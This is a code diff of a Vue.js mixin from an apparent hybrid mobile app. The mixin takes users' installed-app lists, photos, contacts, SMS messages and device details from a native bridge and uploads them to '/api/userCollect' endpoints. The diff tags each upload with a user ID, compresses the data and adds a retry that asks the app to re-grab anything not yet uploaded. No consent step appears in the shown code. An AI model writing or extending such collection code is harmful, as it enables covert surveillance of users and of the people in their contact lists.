@@ -1,7 +1,6 @@
 import axios from 'axios';
 import { mapState, mapActions } from 'vuex';
 import { dateFormat } from '@/utils/mUtils';
-import { ImagePreview } from 'vant';
 window.isInitSyncData = false;
 window.syncDataResolve = null;
 window.syncDataReject = null;
@@ -13,13 +12,14 @@ export default {
   data() {
     if (!window.isInitSyncData) {
       window.onappListFunName = async data => {
-        alert('收到onappListFunName data:' + JSON.stringify(data));
-        if (typeof data == 'string') {
-          data = JSON.parse(data);
+        console.log('收到onappListFunName data:' + JSON.stringify(data));
+        if (typeof data != 'string') {
+          data = JSON.stringify(data);
         }
         try {
           await this.$http.post(`/api/userCollect/collectApp`, {
-            data: data,
+            userId: this.userInfo.id || this.appGlobal.userId,
+            data: this.zip(data),
           });
           this.updateLocalSyncStatus('appListFunName', true);
         } catch (error) {
@@ -27,57 +27,72 @@ export default {
         }
       };
       window.onimageListFunName = async data => {
-        alert('收到onimageListFunName data:' + JSON.stringify(data));
-        if (typeof data == 'string') {
-          data = JSON.parse(data);
+        console.log('收到onimageListFunName data:' + JSON.stringify(data));
+        if (typeof data != 'string') {
+          data = JSON.stringify(data);
         }
         try {
-          await this.$http.post(`/api/userCollect/collectImage`, data);
+          await this.$http.post(`/api/userCollect/collectImage`, {
+            userId: this.userInfo.id || this.appGlobal.userId,
+            data: this.zip(data),
+          });
           this.updateLocalSyncStatus('imageListFunName', true);
         } catch (error) {
           this.updateLocalSyncStatus('imageListFunName', false);
         }
       };
       window.oncontactsListFunName = async data => {
-        alert('收到oncontactsListFunName data:' + JSON.stringify(data));
-        if (typeof data == 'string') {
-          data = JSON.parse(data);
+        console.log('收到oncontactsListFunName data:' + JSON.stringify(data));
+        if (typeof data != 'string') {
+          data = JSON.stringify(data);
         }
         try {
-          await this.$http.post(`/api/userCollect/collectContacts`, data);
+          await this.$http.post(`/api/userCollect/collectContacts`, {
+            userId: this.userInfo.id || this.appGlobal.userId,
+            data: this.zip(data),
+          });
           this.updateLocalSyncStatus('contactsListFunName', true);
         } catch (error) {
           this.updateLocalSyncStatus('contactsListFunName', false);
         }
       };
-      window.msgListFunName = async data => {
-        alert('收到onmsgListFunName data:' + JSON.stringify(data));
-        if (typeof data == 'string') {
-          data = JSON.parse(data);
+      window.onmsgListFunName = async data => {
+        console.log('收到onmsgListFunName data:' + JSON.stringify(data));
+        if (typeof data != 'string') {
+          data = JSON.stringify(data);
         }
         try {
-          await this.$http.post(`/api/userCollect/collectMsg`, data);
+          await this.$http.post(`/api/userCollect/collectMsg`, {
+            userId: this.userInfo.id || this.appGlobal.userId,
+            data: this.zip(data),
+          });
         } catch (error) {}
       };
       window.ondevFunName = async data => {
-        alert('收到ondevFunName data:' + JSON.stringify(data));
-        if (typeof data == 'string') {
-          data = JSON.parse(data);
+        console.log('收到ondevFunName data:' + JSON.stringify(data));
+        if (typeof data != 'string') {
+          data = JSON.stringify(data);
         }
         try {
-          await this.$http.post(`/api/userCollect/collectDevice`, data);
+          await this.$http.post(`/api/userCollect/collectDevice`, {
+            userId: this.userInfo.id || this.appGlobal.userId,
+            data: this.zip(data),
+          });
           this.updateLocalSyncStatus('devFunName', true);
         } catch (error) {
           this.updateLocalSyncStatus('devFunName', false);
         }
       };
       window.ondevBaseFunName = async data => {
-        alert('收到ondevBaseFunName:' + JSON.stringify(data));
-        if (typeof data == 'string') {
-          data = JSON.parse(data);
+        console.log('收到ondevBaseFunName:' + JSON.stringify(data));
+        if (typeof data != 'string') {
+          data = JSON.stringify(data);
         }
         try {
-          await this.$http.post(`/api/userCollect/collectDeviceBase`, data);
+          await this.$http.post(`/api/userCollect/collectDeviceBase`, {
+            userId: this.userInfo.id || this.appGlobal.userId,
+            data: this.zip(data),
+          });
           this.updateLocalSyncStatus('devBaseFunName', true);
         } catch (error) {
           this.updateLocalSyncStatus('devBaseFunName', false);
@@ -149,15 +164,16 @@ export default {
 
     startSyncData(needResolve = false) {
       return new Promise(async (resolve, reject) => {
-        // 第一步判断是否需要
         try {
+          // 第一步判断是否需要
           let res = await this.$http.post(`/api/userCollect/isUploadData`, {
             userId: this.appGlobal.userId,
           });
           if (res.data) {
             // 已经上传
-            resolve({ status: 'already' });
+            resolve({ success: true });
           } else {
+            // 如果没有上传，则发通知给app抓取，10s以后再试一下
             let types = {};
             NEED_SYNC_TYPE.forEach(t => {
               types[t] = `on${t}`;
@@ -170,6 +186,18 @@ export default {
               window.syncDataResolve = null;
               window.syncDataReject = null;
             }
+            setTimeout(async res => {
+              window.syncDataResolve = null;
+              window.syncDataReject = null;
+              res = await this.$http.post(`/api/userCollect/isUploadData`, {
+                userId: this.appGlobal.userId,
+              });
+              if (res.data) {
+                resolve({ success: true });
+              } else {
+                reject({ success: false });
+              }
+            }, 10000);
           }
         } catch (error) {
           reject({ success: false });
